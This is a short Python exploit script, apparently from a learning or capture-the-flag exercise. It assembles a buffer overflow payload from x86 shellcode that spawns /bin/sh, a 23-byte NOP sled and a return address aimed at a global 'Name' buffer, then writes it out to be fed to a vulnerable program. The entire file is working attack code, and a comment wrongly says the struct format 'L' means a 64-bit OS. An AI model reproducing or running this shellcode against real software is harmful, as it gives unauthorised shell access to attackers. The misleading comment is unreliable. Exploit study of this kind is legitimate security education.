import sys, struct

# ret_addr is the return address that brings you back into your NOPS. This will CHANGE regularly
# use gdb to find the address name. 0x80dacc0 is the address of global variable Name, 4 bytes
ret_addr = struct.pack("I", 0x80dacc0)	#= 0xffffd030 #

# payload is the correctly presented shell code, I found online (25 bytes)
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
#"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# no operation is 23 bytes:
buf = "\x90" * 23

# writing to the shell # 25 + 23 + 4 = Name buffer
sys.stdout.write(payload + buf + ret_addr)


# last steps could be implemented as:
#buf = ('\x90' * (buf_len - len(payload))) + payload + struct.pack('<L', ret_addr) # combining all the above. '<' means little-endian in the struct.pack and 'L' signifies 64 bit OS.

#use terminal to save in a txt
